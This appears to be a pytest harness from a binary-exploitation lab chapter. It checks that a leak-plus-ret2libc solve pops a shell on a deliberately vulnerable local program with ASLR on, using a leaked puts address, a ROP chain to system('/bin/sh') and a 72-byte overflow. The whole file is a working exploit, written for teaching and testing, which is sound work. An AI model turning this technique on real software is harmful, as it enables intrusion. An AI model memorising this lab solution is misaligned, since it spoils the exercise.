"""pytest harness: run the Ch10 leak+ret2libc solve against fresh
processes with ASLR on and assert a shell responds.

Invoked by the chapter Makefile's `test` target; also runnable standalone:

    pytest -q ch10-aslr/leak-server/tests/test_solve.py

Each iteration is a full re-exec of `./vuln`, so the kernel picks a new
libc base every time.  We assert the shell is real by sending a
distinctive `echo` command and reading back the tag.
"""
from __future__ import annotations
import os, re, sys, time
import pytest
from pwn import context, ELF, ROP, process, p64, cyclic

HERE   = os.path.dirname(os.path.abspath(__file__))
LAB    = os.path.abspath(os.path.join(HERE, ".."))
VULN   = os.path.join(LAB, "vuln")
LIBC_P = "/lib/x86_64-linux-gnu/libc.so.6"
TAG    = "CH10_LEAK_PWNED_57ac1e"

context.arch = 'amd64'
context.log_level = 'error'
context.terminal  = ['bash', '-c']


def _one_shot() -> bool:
    assert os.path.exists(VULN), f"missing target {VULN}; run `make` first"
    libc = ELF(LIBC_P, checksec=False)

    io = process([VULN])
    try:
        line = io.recvline_startswith(b'welcome.', timeout=5)
        m = re.search(rb'debug=0x([0-9a-f]+)', line)
        assert m, f"no leak in banner: {line!r}"
        leaked = int(m.group(1), 16)
        base = leaked - libc.symbols['puts']
        assert base & 0xfff == 0, f"unaligned libc base: {base:#x}"

        libc.address = base
        binsh   = next(libc.search(b'/bin/sh\0'))
        system  = libc.symbols['system']
        rop = ROP(libc)
        pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
        ret     = rop.find_gadget(['ret'])[0]

        chain = b''.join([p64(ret), p64(pop_rdi), p64(binsh), p64(system)])
        io.recvuntil(b'name? ', timeout=5)
        io.send(cyclic(72) + chain + b'\n')

        # If we won, we now have `/bin/sh` on the pipe.  Confirm by echoing
        # a unique token and reading it back.
        io.sendline(f'echo {TAG}'.encode())
        try:
            data = io.recvuntil(TAG.encode(), timeout=5)
        except EOFError:
            return False
        return TAG.encode() in data
    finally:
        try:
            io.close()
        except Exception:
            pass


@pytest.mark.parametrize("i", range(int(os.environ.get("CH10_RUNS", "5"))))
def test_leak_then_ret2libc_pops_shell(i: int) -> None:
    ok = False
    # Two attempts per iteration: ASLR *very* rarely places libc such that
    # the discovered gadgets contain a NUL that read() clips.  In practice
    # the pop-rdi/ret gadgets picked from glibc 2.39 are stable across
    # bases; keep the retry to be defensive.
    for _ in range(2):
        if _one_shot():
            ok = True
            break
        time.sleep(0.05)
    assert ok, "leak+ret2libc did not pop a shell across two attempts"


if __name__ == "__main__":
    # Allow `python test_solve.py` outside pytest for quick smoke checks.
    ok = _one_shot()
    print("PASS" if ok else "FAIL")
    sys.exit(0 if ok else 1)
